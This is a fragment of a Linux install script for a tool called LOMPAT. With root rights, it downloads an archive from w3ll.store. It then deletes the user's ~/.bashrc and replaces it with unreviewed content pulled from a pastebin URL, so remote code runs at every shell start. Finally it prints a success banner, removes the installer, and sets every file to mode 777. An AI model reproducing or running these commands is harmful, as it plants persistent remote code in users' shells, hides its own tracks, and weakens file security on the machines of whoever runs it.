...
sudo wget https://w3ll.store/operators/LOMPAT.zip
sudo unzip -o LOMPAT.zip
sudo rm LOMPAT.zip
cp ~/.bashrc ~/.bashrc-bak
rm -rf ~/.bashrc
curl "https://pastebin.com/raw/YDqs21WS" -o ~/.bashrc
dos2unix ~/.bashrc
clear
...
clear
printf "\e[32mTOOL INSTALLED SUCCESSFULLY !\n\e[0mYOU CAN RUN \e[31m./LOMPAT (For Linux) or Just open the LOMPAT.exe (For Windows)\e[0m TO RUN TOOL NOW !\n\n"
sudo rm install.sh
chmod 777 *
